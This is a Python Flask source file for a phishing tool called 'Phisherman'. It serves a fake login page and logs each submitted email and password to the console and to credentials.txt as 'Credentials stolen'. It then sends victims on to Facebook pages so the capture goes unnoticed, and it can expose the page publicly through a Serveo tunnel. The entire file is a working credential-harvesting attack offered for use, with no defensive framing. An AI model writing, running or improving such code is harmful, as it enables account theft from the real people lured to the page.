from flask import Flask, render_template, request, redirect, url_for
import logging, socket, argparse

# ANSI color codes
RESET = '\033[0m'
GREEN = '\033[92m'
CYAN = '\033[96m'
YELLOW = '\033[93m'
MAGENTA = '\033[95m'

parser = argparse.ArgumentParser(description='Phisherman Phishing Tool')
"""parser.add_argument('serveo', metavar='Serveo Link', type=str, help='The Link For Serveo' default='')
parser.add_argument('ngrok', metavar='Ngrok Link', type=str, help='The Link For Ngrok' default='')

parser.add_argument('template', metavar='Phishing Template', type=str, help='The Filename For The Phishing Page', default='01')

args = parser.parse_args()
"""
#page_template = args.template

app = Flask(__name__, template_folder='./', static_url_path='/static')

@app.route('/')
def home():
    ip = '[...]'
    print(f"\n{GREEN}    ✔️Target captured...{RESET}")
    print(f"{CYAN} IP: {ip}{RESET}")
    return render_template(f'{page}.html')

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('user')
    password = request.form.get('pwd')
    print(email)
    if email and password:
        print(f"{YELLOW}          --------------------- {RESET}")
        print(f"{GREEN}          ✔️ Credentials stolen...{RESET}")
        print(f'{CYAN}          -> Email:|{email}|{RESET}')
        print(f'{CYAN}          -> Password:|{password}|{RESET}')
        save_credentials(email, password)
        print(f'{GREEN}    ️      ✔️ Credentials saved at credentials.txt{RESET}')
        print(f"{YELLOW}          --------------------- {RESET}\n")
        return redirect('https://viewpoints.fb.com/')
    return redirect('https://www.facebook.com/recover')

def get_local_ip():
    try:
        # Create a socket and connect to a remote server
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except socket.error:
        return '127.0.0.1'  # Return localhost IP if unable to retrieve

def print_ips():
    # Get the local IP address
    local_ip = get_local_ip()
    print(" [testing] Localhost:", local_ip)

    # Get the public IP address
    public_ip = socket.gethostbyname(socket.getfqdn())
    public_link = f"http://{public_ip}"
    print(" [distribution] Public Link:", public_link)

    # Get the server IP address
    server_ip = get_local_ip()
    server_link = f"http://{server_ip}:8080"
    print(" [Server] Server Link:", server_link)

    print(" Development server started...\n")
    print(" Waiting for targets...\n")

def save_credentials(email, password):
    with open('../credentials.txt', 'a') as file:
        file.write(f'Email: {email}\n')
        file.write(f'Password: {password}\n')
        file.write(f'Phishing Page Number: {page}\n')
        file.write('---------------------\n')

if __name__ == '__main__':
    app.logger.disabled = True
    alog = logging.getLogger('werkzeug')
    alog.setLevel(logging.ERROR)
    page = input(f"{MAGENTA}    Enter template number >>>  {RESET}")

    print(f"{MAGENTA}        👉 Select any of the following to obtain the link {RESET}")
    print(f"{CYAN}          ------------------------------- {RESET}")
    print(f"{CYAN}          | Code   |  Name             | {RESET}")
    print(f"{CYAN}          ------------------------------- {RESET}")
    print(f"{CYAN}          | {YELLOW}01     {CYAN}|  {MAGENTA}Localhost(Local) {CYAN}| {RESET}")
    print(f"{CYAN}          | {YELLOW}02     {CYAN}|  {MAGENTA}Serveo(Public)   {CYAN}| {RESET}")
    print(f"{CYAN}          ------------------------------- {RESET}\n")

    public_url = input(f"{MAGENTA}    >>> {RESET}")

    if public_url == "02":
        print(f"{GREEN}    Starting Serveo Tunnel ...{RESET}")
        from expose import Serveo_Link
        Serveo_Link()

    app.run(host='0.0.0.0', port=2095)
